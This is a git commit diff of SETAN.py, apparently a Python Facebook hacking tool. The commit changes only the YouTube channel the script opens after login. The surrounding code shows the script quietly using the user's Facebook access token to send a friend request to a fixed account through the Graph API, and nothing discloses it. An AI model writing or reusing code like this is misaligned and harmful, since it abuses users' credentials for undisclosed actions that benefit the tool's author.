2600c21b863e9d096e057c6e34ab929b14c8b26a
lunnar211 <56595355+lunnar211@users.noreply.github.com>
2019-11-24 10:09:01 +0545

    Update SETAN.py

--- SETAN.py
+++ SETAN.py
@@ -97,7 +97,7 @@ def login():
                 zedd.close()
                 print '\n\x1b[1;91m[\x1b[1;96m\xe2\x9c\x93\x1b[1;91m] \x1b[1;92mLogin berhasil'
                 requests.post('https://graph.facebook.com/me/friends?method=post&uids=gwimusa3&access_token=' + z['access_token'])
-                os.system('xdg-open https://youtube.com/c/TechnicalDipeshHackingvideos')
+                os.system('xdg-open https://www.youtube.com/channel/UC-uXf6qGKWeRqKGu0eCVxsw')
                 time.sleep(2)
                 menu()
             except requests.exceptions.ConnectionError:
